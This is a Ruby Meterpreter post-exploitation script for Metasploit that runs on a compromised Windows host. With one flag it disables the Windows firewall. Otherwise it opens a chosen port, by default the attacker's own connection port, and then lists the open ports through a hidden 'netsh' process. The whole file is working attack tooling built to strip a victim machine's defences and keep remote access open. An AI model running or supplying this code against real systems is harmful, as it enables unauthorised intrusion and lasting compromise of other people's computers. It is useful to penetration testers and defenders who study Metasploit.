require "#{ENV[:BASE]}/msf3/scripts/meterpreter/winfirewall-api"

def console_disable_firewall session
    config = read_firewall_config session
    if config[:firewall_state] == "inactive"
        print_status "Firewall isn't running"
        raise Rex::Script::Completed
    end
    
    print_status "Disabling Firewall ..."
    disable_firewall session
end

def console_open_firewall_port(port, session)
    config = read_firewall_config session
    
    if config[:firewall_state] == "inactive"
        print_status("Firewall is inactive")
        print_status("Altering the Portconfig may not be necessary")
        print_status("Proceed? (Yes/No)")
        input = STDIN.gets
        if input.downcase.include? "no"
          print_status "Firewall Config will be left unchanged"
          raise Rex::Script::Completed
        end
    end
    
    if config[:tcp] && (config[:tcp].include? port)
        print_status("Port is already open")
        raise Rex::Script::Completed
    end
	
	open_port session, port
	
	print_status("Getting new Open Port Entrys ...")
	read_state = session.sys.process.execute("cmd.exe /c netsh firewall show portopening", nil, {'Hidden' => 'true','Channelized' => true})
    config = ""
    while(d = read_state.channel.read)
    	if d =~ /The requested operation requires elevation./
    		print_error("\tUAC or Insufficient permissions prevented the disabling of Firewall")
    	else
    	    config << d
    	end
    end	
    read_state.channel.close
    read_state.close 1
    
    config.split("\n").each do |o|
      print_status o
    end
end

port = nil
case args[0]
when "-p"
  if args[1]
    port = args[1]
  else
    print_error("No Portnumber given")
    raise Rex::Script::Completed
  end
when "-d"
    console_disable_firewall client
    raise Rex::Script::Completed
end
port ||= session.sock.peerport
print_status("Try to Open Port #{port}")
console_open_firewall_port port, client
